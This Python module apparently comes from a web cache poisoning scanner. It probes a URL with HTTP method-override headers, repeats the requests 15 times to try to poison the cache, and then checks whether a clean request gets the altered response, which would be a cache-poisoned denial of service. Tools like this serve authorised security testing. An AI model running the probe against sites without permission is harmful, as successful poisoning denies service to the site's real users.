#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attempts to find Cache Poisoning with HTTP Method Override (HMO)
https://cpdos.org/#HMO
"""

from ..utils import * 

VULN_NAME = "HTTP Method Override"

def HMO(url, s, main_len, main_status_code, authent):
    #HTTP Method Overcide
    methods = ["POST", "PUT", "HELP", "DELETE"]
    heads = ["HTTP-Method-Overrid", "X-HTTP-Method-Override", "X-Method-Override", "Method-Override", "X-HTTP-Method", "HTTP-Method"]
    
    for h in heads:
        for m in methods:
            uri = f"{url}{random.randrange(999)}"
            try:
                headers = {h: m}
                req_hmo = s.get(uri, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)
                if req_hmo.status_code != main_status_code:
                    #print(f"{main_status_code} : {req_hmo.status_code}")
                    for x in range(15):
                        req_hmo = s.get(uri, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)
                    req_verify_hmo = s.get(uri, verify=False, timeout=10, auth=authent)

                    if req_verify_hmo.status_code == req_hmo.status_code and req_verify_hmo.status_code != main_status_code and req_verify_hmo.status_code != 429:
                        print("  \033[31m └── [VULNERABILITY CONFIRMED]\033[0m | HMO DOS: {} | \033[34m{} > {}\033[0m | PAYLOAD: {}".format(uri, main_status_code, req_hmo.status_code, headers))
                elif len(req_hmo.content) not in range(main_len - 1000, main_len + 1000):
                    #print(f"{len(req_hmo.content)} : {main_len} ")
                    for x in range(15):
                        req_hmo = s.get(uri, headers=headers, verify=False, timeout=10, auth=authent, allow_redirects=False)
                    req_verify_hmo = s.get(uri, verify=False, timeout=10, auth=authent)

                    if len(req_hmo.content) == len(req_verify_hmo.content):
                        print("  \033[31m └── [VULNERABILITY CONFIRMED]\033[0m | HMO DOS: {} | \033[34m{}b > {}b\033[0m | PAYLOAD: {}".format(uri, main_len, len(req_hmo.content), headers))
            except Exception as e:
                #print(f"Error : {e}")
                pass
            uri = url